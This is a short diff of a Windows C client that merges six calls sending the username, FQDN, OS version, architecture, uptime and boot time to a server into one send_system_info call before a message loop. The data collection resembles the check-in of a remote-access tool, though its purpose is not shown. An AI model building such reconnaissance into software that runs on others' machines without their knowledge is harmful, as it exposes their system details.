@@ -11,6 +11,7 @@ int main(void) {
     _setmode(_fileno(stderr), _O_U16TEXT);
     _setmode(_fileno(stdin), _O_U16TEXT);
 
+
     if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
         fwprintf(stderr, L"Error: WSAStartup Error. Error Code: %d\n", WSAGetLastError());
         goto cleanup;
@@ -30,12 +31,7 @@ int main(void) {
         goto cleanup;
     }
 
-    send_username_to_server(sock);
-    send_fqdn_to_server(sock);
-    send_os_version_to_server(sock);
-    send_os_architecture_to_server(sock);
-    send_uptime_to_server(sock);
-    send_boot_time_to_server(sock);
+    send_system_info(sock);
 
     run_message_loop();
     exit_status = EXIT_SUCCESS;
